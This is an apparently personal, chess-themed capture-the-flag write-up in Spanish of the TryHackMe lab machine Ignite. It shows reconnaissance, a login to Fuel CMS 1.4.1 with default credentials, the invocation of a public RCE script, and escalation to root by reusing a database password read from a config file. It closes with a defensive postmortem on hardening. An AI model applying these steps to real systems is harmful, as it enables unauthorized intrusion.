```
♟ PARTIDA 009
  IGNITE
  TryHackMe · Easy · Linux
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> fuel cms 1.4.1.
> otra vez.
> credenciales de fábrica sin cambiar.
> contraseña reutilizada entre base de datos y root.
> ya vimos este patrón.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> ignite.
> fuel cms 1.4.1.
> este CMS ya apareció en la partida 003.
> la posición es familiar.
```

> Ignite. El nombre sugiere combustión: algo que empieza. Lo que empieza aquí es la tercera vez que veo Fuel CMS 1.4.1 en esta serie. El patrón se repite porque el error se repite. No en el mismo sistema: en decisiones distintas tomadas por personas distintas que llegaron al mismo resultado.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -sC <IP>

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache 2.4.18
```

```bash
$ curl http://<IP>/

> Fuel CMS 1.4.1
> Welcome to Fuel CMS!
> Default credentials: admin / admin
```

> La página de instalación seguía activa. Con las credenciales por defecto documentadas en pantalla. El administrador instaló el CMS y no terminó el proceso: dejó la guía de instalación pública en producción.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ cat hypothesis.txt
> credenciales admin/admin → acceso al panel
> fuel cms 1.4.1 → CVE de RCE conocido
> archivos de config → contraseña de base de datos
> reutilización → su root
> partida 003 con distinto punto de entrada
```

---

## `> ♜ INICIATIVA: ruptura`

```bash
$ # /fuel/ con admin/admin
> acceso concedido al panel de administración
```

```bash
$ python3 fuel_cms_rce.py -u http://<IP>/

> $ id
  uid=33(www-data)
```

> RCE confirmado. Mismo exploit que la partida 003. Misma versión. Mismo resultado.

---

## `> ♛ REY EXPUESTO: escalada`

```bash
$ cat /var/www/html/fuel/application/config/database.php

> 'password' => '[REDACTED]',
```

```bash
$ su root
Password: [misma contraseña]

> root@machine:~#
```

> Contraseña de base de datos reutilizada como contraseña de root. Mismo patrón que la partida 003. Distinta máquina. Misma decisión.

---

## `> ♚ JAQUE MATE`

```bash
$ cat /root/root.txt
> THM{[REDACTED]}
```

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: página de instalación activa en producción · credenciales admin/admin
MOVIMIENTO 2: fuel cms 1.4.1 sin actualizar · RCE público
MOVIMIENTO 3: contraseña de base de datos reutilizada como contraseña de root
```

> Lo interesante de Ignite no es lo que tiene de diferente a la partida 003. Es lo que tiene de igual.
>
> Fuel CMS 1.4.1. Contraseña en database.php. Reutilización hacia root. El patrón se repite porque no es un error de una persona: es un error de proceso. Nadie revisó la instalación antes de poner el servidor en producción. Nadie tiene una checklist. Nadie preguntó "¿terminamos de configurar esto?".
>
> La guía de instalación en pantalla no es el problema. Es el síntoma.

```bash
$ echo $LESSON
> una instalación sin hardening no está lista.
> está encendida.
> ignite es un buen nombre.
```

---

> *partida 009 · ignite · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  admin/admin.
  la guía de instalación seguía en pantalla.
  ignite es un buen nombre para un sistema
  que se prende fuego solo.
-->
